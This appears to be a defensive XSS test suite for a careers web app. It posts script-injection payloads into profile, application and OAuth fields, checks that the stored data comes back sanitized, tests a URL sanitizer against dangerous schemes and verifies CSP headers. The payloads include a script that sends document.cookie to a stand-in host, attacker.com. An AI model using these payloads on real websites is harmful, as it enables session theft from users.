import axios from 'axios';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import db from '../server/db/sqliteClient.js';
import { sanitizeInputString, sanitizeSafeUrl, escapeHtml } from '../server/services/textSanitizer.js';
import { sanitizeUrl, safeOpenUrl } from '../src/utils/sanitizeUrl.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT_DIR = path.resolve(__dirname, '../');

const BASE_URL = 'http://127.0.0.1:5000/api/v1';

async function runXssSecurityAudit() {
  console.log('================================================================');
  console.log('🛡️ CAREERLY PRODUCTION-GRADE XSS SECURITY & HARDENING AUDIT');
  console.log('================================================================\n');

  let passed = 0;
  let total = 0;

  function assert(condition, testName) {
    total++;
    if (condition) {
      console.log(`  [PASS] ✓ ${testName}`);
      passed++;
    } else {
      console.error(`  [FAIL] ✗ ${testName}`);
      throw new Error(`XSS Test Failed: ${testName}`);
    }
  }

  const timestamp = Date.now();
  const testUserEmail = `xss.victim.${timestamp}@example.com`;

  // 1. Authenticate / Register Test User
  console.log('1. Setting up Test User Fixture...');
  const userRes = await axios.post(`${BASE_URL}/auth/google`, {
    email: testUserEmail,
    full_name: 'Security Test Target',
    google_id: `g-xss-${timestamp}`
  });
  const userToken = userRes.data.token;
  const userId = userRes.data.user.id;
  assert(Boolean(userToken), 'Test user registered with authenticated session token');

  // -------------------------------------------------------------
  // TEST 1: STORED XSS IN USER PROFILE INPUTS
  // -------------------------------------------------------------
  console.log('\n2. Testing: Stored XSS in User Profile Updates (PUT /api/v1/user/profile)...');
  const xssProfilePayloads = {
    full_name: 'John <script>alert("XSS_FULLNAME")</script>Doe',
    headline: 'Frontend Engineer <img src=x onerror="alert(\'XSS_IMG\')">',
    phone: '+1 555 <svg onload=alert("XSS_SVG")> 1234',
    field_of_study: 'Computer Science <iframe src="javascript:alert(1)"></iframe>',
    university: 'MIT <math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style>',
    skills: ['React', 'Node.js <script>alert("XSS_SKILL")</script>', '<b onmouseover=alert(1)>CSS</b>'],
    linkedin_url: 'javascript:alert("XSS_LINKEDIN")',
    portfolio_url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    github_url: 'https://github.com/legitimate-user',
    resume_text: 'Experienced software developer with <script>stealCookies()</script> 5 years experience.'
  };

  const updateProfileRes = await axios.put(`${BASE_URL}/user/profile`, xssProfilePayloads, {
    headers: { Authorization: `Bearer ${userToken}` }
  });
  assert(updateProfileRes.data.status === 'success', 'Profile update API processed request safely');

  // Verify stored data in database via GET /profile
  const getProfileRes = await axios.get(`${BASE_URL}/user/profile`, {
    headers: { Authorization: `Bearer ${userToken}` }
  });
  const savedProfile = getProfileRes.data.profile;

  assert(!savedProfile.full_name.includes('<script>'), 'full_name: <script> tag neutralized in stored profile');
  assert(!savedProfile.headline.includes('onerror='), 'headline: inline onerror handler stripped');
  assert(!savedProfile.phone.includes('<svg'), 'phone: <svg> injection stripped');
  assert(!savedProfile.field_of_study.includes('<iframe'), 'field_of_study: <iframe> tag stripped');
  assert(!savedProfile.university.includes('<math'), 'university: <math> injection stripped');
  assert(!savedProfile.skills.some(s => s.includes('<script>') || s.includes('onmouseover=')), 'skills: array items sanitized of script and event handlers');
  assert(!savedProfile.linkedin_url || !savedProfile.linkedin_url.toLowerCase().startsWith('javascript:'), 'linkedin_url: javascript: scheme neutralized (set to null)');
  assert(!savedProfile.portfolio_url || !savedProfile.portfolio_url.toLowerCase().startsWith('data:'), 'portfolio_url: data:text/html scheme neutralized (set to null)');
  assert(savedProfile.github_url === 'https://github.com/legitimate-user', 'github_url: legitimate https:// URL preserved intact');
  assert(!savedProfile.resume_text.includes('<script>'), 'resume_text: <script> tag stripped');

  // -------------------------------------------------------------
  // TEST 2: STORED XSS IN CRM APPLICATION NOTES
  // -------------------------------------------------------------
  console.log('\n3. Testing: Stored XSS in CRM Applications (POST /api/v1/applications)...');
  const existingOpp = db.prepare('SELECT id FROM opportunities LIMIT 1').get();
  const testOppId = existingOpp ? existingOpp.id : 'opp-xss-001';

  if (!existingOpp) {
    db.prepare("INSERT OR IGNORE INTO opportunities (id, title, company, organization) VALUES (?, 'Test Opp', 'Test Co', 'Test Org')").run(testOppId);
  }

  const appXssPayload = {
    opportunity_id: testOppId,
    stage: 'interview',
    notes: 'Recruiter call notes: <script>document.location="http://attacker.com/steal?c="+document.cookie</script> Good candidate',
    cover_letter: 'Dear Team, <img src=1 onerror=alert(document.cookie)> I am excited to apply.',
    custom_cv_bullets: '• Led React migrations <a href="javascript:alert(1)">Click</a>'
  };

  const appPostRes = await axios.post(`${BASE_URL}/applications`, appXssPayload, {
    headers: { Authorization: `Bearer ${userToken}` }
  });
  assert(appPostRes.data.status === 'success', 'Application post processed');

  const appListRes = await axios.get(`${BASE_URL}/applications`, {
    headers: { Authorization: `Bearer ${userToken}` }
  });
  const savedApp = appListRes.data.applications.find(a => a.opportunity_id === testOppId);

  assert(Boolean(savedApp), 'Application record retrieved');
  assert(!savedApp.notes.includes('<script>'), 'Application notes: <script> stripped');
  assert(!savedApp.cover_letter.includes('onerror='), 'Cover letter: inline onerror handler stripped');
  assert(!savedApp.custom_cv_bullets.includes('javascript:'), 'Custom bullets: javascript: pseudo-protocol stripped');

  // -------------------------------------------------------------
  // TEST 3: REGISTRATION & GOOGLE AUTH XSS SANITIZATION
  // -------------------------------------------------------------
  console.log('\n4. Testing: Stored XSS in Registration & OAuth Ingestion...');
  const maliciousGoogleUser = `xss.oauth.${timestamp}@example.com`;
  const oauthRes = await axios.post(`${BASE_URL}/auth/google`, {
    email: maliciousGoogleUser,
    full_name: 'Malicious <script>alert("OAuth_XSS")</script> User',
    avatar_url: 'javascript:alert("XSS_AVATAR")',
    google_id: `g-xss-oauth-${timestamp}`
  });
  assert(oauthRes.data.status === 'success', 'OAuth ingestion processed safely');

  const dbUser = db.prepare('SELECT u.avatar_url, cp.full_name FROM users u LEFT JOIN career_profiles cp ON u.id = cp.user_id WHERE u.email = ?').get(maliciousGoogleUser);
  assert(!dbUser.full_name.includes('<script>'), 'OAuth full_name: <script> neutralized');
  assert(!dbUser.avatar_url || !dbUser.avatar_url.toLowerCase().startsWith('javascript:'), 'OAuth avatar_url: javascript: scheme blocked');

  // -------------------------------------------------------------
  // TEST 4: FRONTEND URL SANITIZER UNIT MATRIX
  // -------------------------------------------------------------
  console.log('\n5. Testing: Frontend URL Sanitizer (sanitizeUrl / safeOpenUrl)...');
  const dangerousUrls = [
    'javascript:alert(1)',
    'JavaScript:alert(document.cookie)',
    '  javascript:void(0)  ',
    'javascript\u0000:alert(1)',
    'vbscript:msgbox(1)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'file:///etc/passwd',
    'blob:https://example.com/uuid'
  ];

  for (const badUrl of dangerousUrls) {
    const sanitized = sanitizeUrl(badUrl);
    assert(sanitized === '#', `sanitizeUrl blocks: "${badUrl.slice(0, 30)}..." -> "${sanitized}"`);
  }

  const safeUrls = [
    'https://careers.google.com/jobs/results/12345',
    'http://jobs.lever.co/company/role-id',
    'https://linkedin.com/in/john-doe',
    'mailto:careers@example.com',
    'tel:+15551234567',
    '/opportunities/opp-123',
    '#features-section'
  ];

  for (const goodUrl of safeUrls) {
    const sanitized = sanitizeUrl(goodUrl);
    assert(sanitized === goodUrl, `sanitizeUrl preserves legitimate: "${goodUrl}"`);
  }

  // -------------------------------------------------------------
  // TEST 5: CONTENT SECURITY POLICY (CSP) HEADERS AUDIT
  // -------------------------------------------------------------
  console.log('\n6. Testing: Content-Security-Policy & HTTP Security Headers...');
  const healthRes = await axios.get(`${BASE_URL}/admin/security/status`, {
    headers: { Authorization: `Bearer ${userRes.data.token}` },
    validateStatus: () => true // Allow 403 response
  });

  const cspHeader = healthRes.headers['content-security-policy'];
  assert(Boolean(cspHeader), 'Content-Security-Policy header is present on HTTP responses');
  assert(cspHeader.includes("default-src 'self'"), "CSP contains: default-src 'self'");
  assert(cspHeader.includes("object-src 'none'"), "CSP contains: object-src 'none' (blocks malicious plugins/applets)");
  assert(cspHeader.includes("frame-ancestors 'none'"), "CSP contains: frame-ancestors 'none' (blocks UI redressing/clickjacking)");
  assert(!cspHeader.includes("'unsafe-eval'"), "CSP strictly disallows 'unsafe-eval' (prevents DOM eval injection)");
  assert(healthRes.headers['x-content-type-options'] === 'nosniff', 'X-Content-Type-Options: nosniff verified');
  assert(healthRes.headers['x-frame-options'] === 'SAMEORIGIN' || Boolean(cspHeader), 'Frame protection verified');

  console.log('\n================================================================');
  console.log(`🎉 ALL ${passed}/${total} PRODUCTION XSS DEFENSE CHECKS PASSED (100%)!`);
  console.log('================================================================\n');
}

runXssSecurityAudit().catch(err => {
  console.error('XSS Audit Failure:', err.message);
  process.exit(1);
});
